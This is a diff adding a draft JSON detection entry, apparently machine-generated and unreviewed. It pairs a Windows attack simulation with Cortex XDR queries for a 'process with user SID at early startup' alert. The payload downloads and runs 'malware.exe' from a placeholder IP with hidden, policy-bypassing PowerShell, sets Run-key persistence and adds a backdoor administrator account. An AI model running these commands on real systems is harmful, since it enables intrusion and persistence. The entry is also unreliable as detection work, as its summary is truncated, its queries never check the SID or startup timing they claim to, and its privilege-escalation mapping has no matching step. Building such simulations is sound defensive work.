@@ -1,0 +1,195 @@
+{
+  "id": "TTP-0000-0082",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "draft",
+  "metadata": {
+    "created_at": "2026-11-12T00:00:00Z",
+    "updated_at": "2026-11-12T00:00:00Z",
+    "authors": [
+      {
+        "name": "detdev pipeline (local model, unreviewed)",
+        "role": "generator"
+      }
+    ],
+    "tags": [
+      "generated-draft",
+      "platform-windows",
+      "endpoint",
+      "cortex-analytics-alert"
+    ],
+    "pov_engine": {
+      "auto_load": false,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "platforms": [
+        "windows"
+      ],
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "Execution of Uncommon Process with User SID at Early Startup",
+    "summary": "An attacker executes a rare process using a local or domain user SID during system startup, potentially leveraging persistence mechanisms. Cortex should detect this anomalous behavior based on process",
+    "description": "An attacker executes a rare process using a local or domain user SID during system startup, potentially leveraging persistence mechanisms. Cortex should detect this anomalous behavior based on process execution patterns and user context."
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1059",
+        "subtechnique_id": "T1059.001",
+        "name": "Command and Scripting Interpreter: PowerShell",
+        "tactic_ids": [
+          "TA0002"
+        ],
+        "tactic_names": [
+          "Execution"
+        ]
+      },
+      {
+        "technique_id": "T1547",
+        "subtechnique_id": "T1547.001",
+        "name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
+        "tactic_ids": [
+          "TA0003"
+        ],
+        "tactic_names": [
+          "Persistence"
+        ]
+      },
+      {
+        "technique_id": "T1068",
+        "name": "Exploitation for Privilege Escalation",
+        "tactic_ids": [
+          "TA0004"
+        ],
+        "tactic_names": [
+          "Privilege Escalation"
+        ]
+      }
+    ]
+  },
+  "execution": {
+    "target_platform": "windows",
+    "execution_framework": "custom-cortex",
+    "privilege_required": "administrator",
+    "payload": {
+      "interpreter": "powershell",
+      "code": "powershell.exe -NoP -W Hidden -Exec Bypass -Command \"Invoke-WebRequest -Uri 'http://192.0.2.10/malware.exe' -OutFile 'C:\\\\Windows\\\\Temp\\\\malware.exe'\"\nstart-process -FilePath \"C:\\\\Windows\\\\Temp\\\\malware.exe\" -ArgumentList '/s /v /q'\nreg add \"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" /v \"Updater\" /t REG_SZ /d \"C:\\\\Windows\\\\Temp\\\\malware.exe\" /f\nnet user attacker P@ssw0rd /add\nnet localgroup administrators attacker /add",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "process",
+        "description": "Execution of PowerShell with hidden flag and bypass execution policy",
+        "expected_value": "action_process_image_name = 'powershell.exe' and actor_process_image_name = 'cmd.exe'"
+      },
+      {
+        "artifact_type": "file",
+        "description": "Downloaded malware file in Temp directory",
+        "expected_value": "action_file_path = 'C:\\\\Windows\\\\Temp\\\\malware.exe'"
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "Outbound connection to C2 server",
+        "expected_value": "action_remote_ip = '192.0.2.10'"
+      }
+    ],
+    "cleanup": {
+      "manual_steps": [
+        "Not authored. Write and test cleanup before promotion."
+      ]
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "Uncommon Process with Local/User SID at Startup",
+        "description": "Detection of an uncommon process being executed with a local or domain user SID during early startup stages",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = 'cmd.exe'\n| filter action_process_image_name in ('powershell.exe', 'reg.exe', 'net.exe')\n| filter causality_actor_process_image_name = 'services.exe' or causality_actor_process_image_name = 'svchost.exe'\n| filter not action_file_path contains 'system32' or action_file_path contains 'Temp'",
+        "mitre_technique_ids": [
+          "T1059.001",
+          "T1547.001",
+          "T1068"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
+    "abiocs": [
+      {
+        "name": "Early Startup Execution with User Context",
+        "description": "Behavioral deviation indicating execution of uncommon process with user SID at early startup stage",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = 'cmd.exe'\n| filter action_process_image_name in ('powershell.exe', 'reg.exe', 'net.exe')\n| filter causality_actor_process_image_name = 'services.exe' or causality_actor_process_image_name = 'svchost.exe'\n| filter not action_file_path contains 'system32' or action_file_path contains 'Temp'\n| filter action_process_image_name != 'explorer.exe'",
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "services.exe",
+        "mitre_technique_ids": [
+          "T1059.001",
+          "T1547.001",
+          "T1068"
+        ],
+        "severity": "high"
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "Hunt for Early Startup Processes with User Context",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = 'cmd.exe'\n| filter action_process_image_name in ('powershell.exe', 'reg.exe', 'net.exe')\n| filter causality_actor_process_image_name = 'services.exe' or causality_actor_process_image_name = 'svchost.exe'\n| filter not action_file_path contains 'system32' or action_file_path contains 'Temp'",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [],
+    "iocs": [],
+    "analytics_modules": [
+      "Cortex XSIAM Analytics (XDR Agent) — Execution of an uncommon process with a local/domain user SID at an early startup stage; Required Data: XDR Agent. Ref: https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/execution-of-an-uncommon-process-with-a-local-domain-user-sid-at-an-early-startup-stage"
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "analytics",
+        "coverage_tier": "detection"
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "Cortex XDR Analytics Alert Reference: Execution of an uncommon process with a local/domain user SID at an early startup stage",
+      "url": "https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/execution-of-an-uncommon-process-with-a-local-domain-user-sid-at-an-early-startup-stage",
+      "publisher": "Palo Alto Networks",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1059.001",
+      "url": "https://attack.mitre.org/techniques/T1059/001/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1547.001",
+      "url": "https://attack.mitre.org/techniques/T1547/001/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1068",
+      "url": "https://attack.mitre.org/techniques/T1068/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-11-12",
+      "author": "detdev pipeline (local model, unreviewed)",
+      "change": "Generated draft. Built from the model fragment and its recorded source only; not reviewed, not run."
+    }
+  ]
+}
